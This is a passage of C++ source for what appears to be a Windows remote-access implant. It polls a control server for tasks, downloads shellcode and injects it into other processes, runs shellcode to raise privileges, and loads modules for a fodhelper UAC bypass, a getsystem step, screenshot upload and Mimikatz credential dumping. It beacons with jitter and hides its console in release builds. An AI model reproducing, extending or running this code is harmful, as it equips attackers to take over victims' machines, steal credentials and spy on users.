			result.output = "Invalid PID provided: " + input;
			result.status = 5;
			break;
		}
		// Open the target process
		HANDLE hTarget = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, targetPid);
		if (!hTarget) {
			result.output = "Failed to open target process. Error: " + std::to_string(GetLastError());
			result.status = 5;
			break;
		}
		std::string shellcode_payload = DownloadFilePayload(task);
		if (shellcode_payload.empty()) {
			result.output = "Failed to download shellcode payload.";
			result.status = 5;
			CloseHandle(hTarget);
			break;
		}
		// Inject the shellcode into the target process.
		int injectStatus = Inject_CreateRemoteThread(hTarget, (PVOID)shellcode_payload.c_str(), shellcode_payload.size());
		if (injectStatus == 0) {
			result.output = "";
			result.status = 4;
		}
		else {
			result.output = "Remote injection failed.";
			result.status = 5;
		}
		CloseHandle(hTarget);
		break;
	}		 
	case 10: { // SetPriv task
			// Download the shellcode for the setpriv module from the server
		std::string shellcode = DownloadFilePayload(task);
		if (shellcode.empty()) {
			result.status = 5; // Failure
			result.output = "Failed to download setpriv shellcode.";
			break;
		}
		// Execute the shellcode using the self-injection mechanism
		bool execSuccess = ExecuteSetPrivShellcode((char*)shellcode.data(), shellcode.size());
		if (execSuccess) {
			// On success, mark the task as successful with an empty output string
			result.status = 4; // Success
			result.output = "";
		}
		else {
			result.status = 5; // Failure
			result.output = "Setpriv shellcode execution failed.";
		}
		break;
	}
	case 12: { // BypassUAC
	// We expect the input to be: "1 <cmd w/ args>"
		std::string inputStr = task["input"].get<std::string>();
		std::istringstream iss(inputStr);
		std::string method;
		iss >> method;
		nlohmann::json j; 

		if (method != "1") {
			j["output"] = "Error: Only method 1 (fodhelper) is supported for bypassuac.";
			result.status = 5;
		}
		else {
			std::string cmd;
			std::getline(iss, cmd);
			if (!cmd.empty() && cmd[0] == ' ')
				cmd.erase(0, 1);

			const char* dllPath = "modules\\bypassuac_fodhelper_x64.dll";
			HMODULE hDll = LoadLibraryA(dllPath);
			if (!hDll) {
				j["output"] = "Failed to load DLL: " + std::string(dllPath);
				result.status = 5;
			}
			else {
				typedef LPWSTR(*BypassUACFunc)(LPCWSTR, DWORD);
				BypassUACFunc bypassFunc = (BypassUACFunc)GetProcAddress(hDll, "ExecuteW");
				if (!bypassFunc) {
					j["output"] = "Failed to get function ExecuteW from DLL.";
					result.status = 5;
					FreeLibrary(hDll);
				}
				else {

					int size_needed = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
					std::wstring wCommand(size_needed, 0);
					MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, &wCommand[0], size_needed);

					LPWSTR pBypassResult = bypassFunc(wCommand.c_str(), (DWORD)(wCommand.length() + 1));
					if (pBypassResult != NULL) {
						j["output"] = "BypassUAC executed successfully.";
						result.status = 4;

						delete[] pBypassResult;
					}
					else {
						j["output"] = "BypassUAC failed.";
						result.status = 5;
					}
					FreeLibrary(hDll);
				}
			}
		}
		std::string jsonResult = j.dump();
		result.output = base64_encode(jsonResult);
		break;
	}

	case 13: 
	{ // Getsystem
	// Expected input format: "1 <cmd w/ args>"
		std::string input = task["input"].get<std::string>();
		std::istringstream iss(input);
		std::string method;
		iss >> method;
		if (method != "1") {
			result.status = 5;
			result.output = "Error: Only method 1 (pipe) is supported for getsystem.";
			break;
		}
		// Combine the remaining arguments into a single command string
		std::string cmd;
		std::getline(iss, cmd);
		if (!cmd.empty() && cmd[0] == ' ')
			cmd.erase(0, 1);

		// Load the getsystem DLL from the modules directory.
		const char* dllPath = "modules\\getsystem_pipe_x64.dll";
		HMODULE hDll = LoadLibraryA(dllPath);
		if (!hDll) {
			result.status = 5;
			result.output = "Failed to load DLL: " + std::string(dllPath);
			break;
		}

		// Get the function pointer for ExecuteW.
		typedef LPWSTR(*ExecuteWFunc)(LPCWSTR, DWORD);
		ExecuteWFunc ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "ExecuteW");
		if (!ExecuteW) {
			result.status = 5;
			result.output = "Failed to get function ExecuteW from DLL.";
			FreeLibrary(hDll);
			break;
		}

		// Convert the command string to wide characters.
		std::wstring wCmd(cmd.begin(), cmd.end());
		LPWSTR wResult = ExecuteW(wCmd.c_str(), static_cast<DWORD>(wCmd.size() + 1));
		if (wResult && wResult[0] == L'1') {
			result.status = 4;
			result.output = "Getsystem executed successfully.";
		}
		else {
			result.status = 5;
			result.output = "Getsystem failed.";
		}
		FreeLibrary(hDll);
		break;
	}
	case 14: {
		// Define the relative path to the screenshot module DLL.
		const char* dllPath = "modules\\screenshot_x64.dll";
		HMODULE hScreenshot = LoadLibraryA(dllPath);
		if (!hScreenshot) {
			result.status = 5;
			result.output = "Failed to load screenshot module from path: ";
			result.output += dllPath;
			break;
		}

		// Exported function signature: int ExecuteW(char** output, int* size);
		typedef int(*pExecuteW)(char**, int*);
		pExecuteW ScreenshotFunc = (pExecuteW)GetProcAddress(hScreenshot, "ExecuteW");
		if (!ScreenshotFunc) {
			result.status = 5;
			result.output = "Failed to locate ExecuteW in screenshot module.";
			FreeLibrary(hScreenshot);
			break;
		}

		// Call ExecuteW to get the Base64-encoded screenshot string.
		char* base64Screenshot = nullptr;
		int dataSize = 0;
		int ret = ScreenshotFunc(&base64Screenshot, &dataSize);

		if (ret != 0 || base64Screenshot == nullptr || dataSize <= 0) {
			FreeLibrary(hScreenshot);
			result.status = 5;
			result.output = "Screenshot function failed.";
			break;
		}

		// Construct a std::string from the returned buffer.
		std::string b64Screenshot(base64Screenshot, dataSize);
		PRINTF("[DEBUG] Base64 Screenshot (first 50 chars): %.50s\n", b64Screenshot.c_str());

		typedef void(*pFreeScreenshotMem)(void*);
		pFreeScreenshotMem pFreeMem = (pFreeScreenshotMem)GetProcAddress(hScreenshot, "FreeScreenshotMemory");
		if (pFreeMem) {
			pFreeMem(base64Screenshot);  // Freed via DLL function
		}
		FreeLibrary(hScreenshot);

		// Decode the Base64 string to obtain binary PNG data.
		std::string pngData = base64_decode(b64Screenshot);
		if (pngData.empty()) {
			result.status = 5;
			result.output = "Failed to decode screenshot data.";
			break;
		}

		// Write the PNG data to a temporary file.
		std::string taskId = task["id"].get<std::string>();
		std::string tempFilePath = "temp_screenshot_" + taskId + ".png";
		FILE* fp = fopen(tempFilePath.c_str(), "wb");
		if (!fp) {
			result.status = 5;
			result.output = "Failed to open temporary file for screenshot upload.";
			break;
		}
		size_t written = fwrite(pngData.data(), 1, pngData.size(), fp);
		fclose(fp);

		if (written != pngData.size()) {
			result.status = 5;
			result.output = "Error writing complete screenshot data to temporary file.";
			break;
		}

		// Debug the file size and contents
		FILE* checkFp = fopen(tempFilePath.c_str(), "rb");
		if (checkFp) {
			fseek(checkFp, 0, SEEK_END);
			long fileSize = ftell(checkFp);
			fclose(checkFp);
			PRINTF("[DEBUG] Written screenshot file size: %ld bytes\n", fileSize);
		}

		// Use the UploadFile helper function to upload the screenshot
		std::string outputMessage;
		bool success = UploadFile(taskId, tempFilePath, outputMessage);

		// Regardless of upload result, try to delete the temporary file
		remove(tempFilePath.c_str());

		result.status = success ? 4 : 5;
		result.output = outputMessage;
		break;
	}
	//hi


	case 15: 
	{ // Sleep/Jitter Task
	// Expected input format: "sleep_time jitter_max [jitter_min]"
		std::istringstream iss(input);
		int newSleepTime, newJitterMax, newJitterMin = 25; // default jitter_min
		if (!(iss >> newSleepTime >> newJitterMax)) {
			result.status = 5;
			result.output = "Invalid parameters for sleep command.";
			break;
		}
		if (!(iss >> newJitterMin)) {
			newJitterMin = 25; // use default if not provided
		}
		if (newJitterMax < newJitterMin) {
			newJitterMin = 0; 
		}
		// Update global values
		globalSleepTime = newSleepTime;
		globalJitterMax = newJitterMax;
		globalJitterMin = newJitterMin;

		std::ostringstream oss;
		oss << "Sleep configuration updated: " << newSleepTime << " seconds, jitter_max: "
			<< newJitterMax << "%, jitter_min: " << newJitterMin << "%";
		result.status = 4;
		result.output = oss.str();
		break;
	}

	case 16: { // Mimikatz Task
	// Expect a semicolon-delimited argument string
		std::string args = input;
		if (args.empty()) {
			result.status = 5;
			result.output = "Usage: mimikatz \"mod::cmd1;mod::cmd2;...\"";
			break;
		}

		// Create pipes to capture standard output
		HANDLE hReadPipe, hWritePipe;
		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

		if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
			result.status = 5;
			result.output = "Failed to create pipes for output redirection";
			break;
		}

		// Save the current stdout handle
		HANDLE hOldStdout = GetStdHandle(STD_OUTPUT_HANDLE);

		// Set stdout to our pipe
		if (!SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe)) {
			CloseHandle(hReadPipe);
			CloseHandle(hWritePipe);
			result.status = 5;
			result.output = "Failed to redirect stdout";
			break;
		}

		// Load the Mimikatz DLL
		const char* dllPath = "modules\\mimikatz_x64.dll";
		HMODULE hDll = LoadLibraryA(dllPath);
		if (!hDll) {
			// Restore stdout
			SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
			CloseHandle(hReadPipe);
			CloseHandle(hWritePipe);

			result.status = 5;
			result.output = std::string("Failed to load DLL: ") + dllPath;
			PRINTF("[DEBUG] LoadLibrary failed with error: %d\n", GetLastError());
			break;
		}

		// Try to get the exports with different naming conventions
		PRINTF("[DEBUG] Looking for exported functions in mimikatz DLL\n");

		// Get the ExecuteW function
		typedef LPWSTR(*ExecuteWFunc)(LPWSTR);
		ExecuteWFunc ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "ExecuteW");

		// If ExecuteW is not found, try alternatives
		if (!ExecuteW) {
			PRINTF("[DEBUG] ExecuteW not found, error: %d\n", GetLastError());
			ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "_ExecuteW");

			if (!ExecuteW) {
				PRINTF("[DEBUG] _ExecuteW not found, trying Invoke\n");
				ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "Invoke");

				if (!ExecuteW) {
					// Restore stdout
					SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
					CloseHandle(hReadPipe);
					CloseHandle(hWritePipe);
					FreeLibrary(hDll);

					result.status = 5;
					result.output = "Failed to locate any expected function in mimikatz module.";
					break;
				}
			}
		}

		// Get optional Init/Cleanup functions
		typedef void (WINAPI *InitFunc)();
		typedef void (WINAPI *CleanupFunc)();
		InitFunc Init = (InitFunc)GetProcAddress(hDll, "Init");
		CleanupFunc Cleanup = (CleanupFunc)GetProcAddress(hDll, "Cleanup");

		// Initialize if the function exists
		if (Init) {
			PRINTF("[DEBUG] Calling Init function\n");
			Init();
		}

		// Convert UTF-8 args to wide
		int wlen = MultiByteToWideChar(CP_UTF8, 0, args.c_str(), -1, NULL, 0);
		std::wstring wArgs(wlen, 0);
		MultiByteToWideChar(CP_UTF8, 0, args.c_str(), -1, &wArgs[0], wlen);

		// Execute the mimikatz commands
		PRINTF("[DEBUG] Calling the mimikatz function with args: %s\n", args.c_str());
		LPWSTR wOut = ExecuteW(const_cast<LPWSTR>(wArgs.c_str()));

		// Call cleanup if available
		if (Cleanup) {
			PRINTF("[DEBUG] Calling Cleanup function\n");
			Cleanup();
		}

		// Close the write end of the pipe so ReadFile will complete
		CloseHandle(hWritePipe);

		// Read the captured output
		std::string capturedOutput;
		char buffer[4096];
		DWORD bytesRead;

		while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
			buffer[bytesRead] = '\0';
			capturedOutput += buffer;
		}

		// Restore the original stdout
		SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
		CloseHandle(hReadPipe);

		// Even if wOut is NULL, we may have captured output
		if (!capturedOutput.empty()) {
			result.status = 4; // Success
			result.output = capturedOutput;
			PRINTF("[DEBUG] Captured mimikatz output: %.100s\n", capturedOutput.c_str());
		}
		else if (wOut) {
			// If we have a return value but no captured output, convert it
			int outLen = WideCharToMultiByte(CP_UTF8, 0, wOut, -1, NULL, 0, NULL, NULL);
			std::string outBuf(outLen, 0);
			WideCharToMultiByte(CP_UTF8, 0, wOut, -1, &outBuf[0], outLen, NULL, NULL);

			result.status = 4; // Success
			result.output = outBuf;
			PRINTF("[DEBUG] Mimikatz function output: %.100s\n", outBuf.c_str());

			delete[] wOut;
		}
		else {
			PRINTF("[DEBUG] No output captured from mimikatz\n");
			result.status = 5; // Failure
			result.output = "Mimikatz execution failed - no output captured.";
		}

		FreeLibrary(hDll);
		break;
	}



	default:
		result.status = 7;
		result.output = "Task type not recognized";
		break;
	}
	return result;
}

int addJitter(int sleepTime, int jitterPercentage)
{
	// Calculate the maximum jitter value as a percentage of the sleep time
	int jitter = (sleepTime * jitterPercentage) / 100;
	// Generate a random jitter between 0 and jitter (inclusive)
	int randomJitter = rand() % (jitter + 1);
	// Return the sleep time increased by the random jitter
	return sleepTime + randomJitter;
}

void SendTaskResponse(const json &task, const TaskResult &tr) {
	// First, create the response data
	json responseData = {
		{"id", task["id"]},
		{"agent_id", agent_id},
		{"result", base64_encode(tr.output)},
		{"status", tr.status}
	};

	// Base64 encode the response data
	std::string encoded_data = base64_encode(responseData.dump());

	// Create the outer request with ht=3 for TaskResult
	json payload = {
		{"data", encoded_data},
		{"ht", 3}  // requesttype.TaskResult.value
	};

	PRINTF("[DEBUG] Response Data (Before Base64 Encoding): %s\n", responseData.dump().c_str());

	// Since we don't need the response, use the fire-and-forget version
	if (postEncryptedFireAndForget(payload)) {
		PRINTF("[DEBUG] Task result sent successfully\n");
	}
	else {
		CERR("[ERROR] Failed to send task response\n");
	}
}

void PollForTasks() {
	// Create the data structure the server expects
	json agentData = { {"agent_id", agent_id} };

	// Base64 encode the agent data
	std::string encoded_data = base64_encode(agentData.dump());

	// Create the outer JSON structure with ht=2 for GetNextTask
	json requestData = {
		{"data", encoded_data},
		{"ht", 2}  // requesttype.GetNextTask.value
	};

	json task;
	if (sendEncryptedRequest(requestData, task)) {
		// Check if the response is an error message
		if (task.contains("message") && task["message"] == "error") {
			PRINTF("[DEBUG] Received error response from server\n");
			return; // Skip processing if we got an error
		}

		// Check if the task is empty (no task available)
		if (task.empty() || (task.size() == 1 && task.contains("message"))) {
			if (VERBOSE) {
				PRINTF("[DEBUG] No task available.\n");
			}
			return;
		}

		// Only process if we have a valid task
		if (task.contains("type") && task.contains("id")) {
			PRINTF("[DEBUG] Task received: %s\n", task.dump().c_str());
			TaskResult tr = ExecuteTask(task);
			SendTaskResponse(task, tr);
		}
		else {
			PRINTF("[DEBUG] Received invalid task format: %s\n", task.dump().c_str());
		}
	}
}


// ------------------ Main Loop ------------------
#ifdef _DEBUG
int main(void)
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
#endif
{
	// Your existing main code...

	if (!RegisterWithServer()) {
		// In release mode, don't print to console
#ifdef _DEBUG
		CERR("[-] Registration failed. Exiting.\n");
#endif
		ExitProcess(0);
	}

	srand((unsigned int)time(NULL));

	while (true) {
		PollForTasks();
		int sleepTimeWithJitter = addJitter(globalSleepTime, globalJitterMax);
		Sleep(sleepTimeWithJitter * 1000);
	}

	return 0;
}
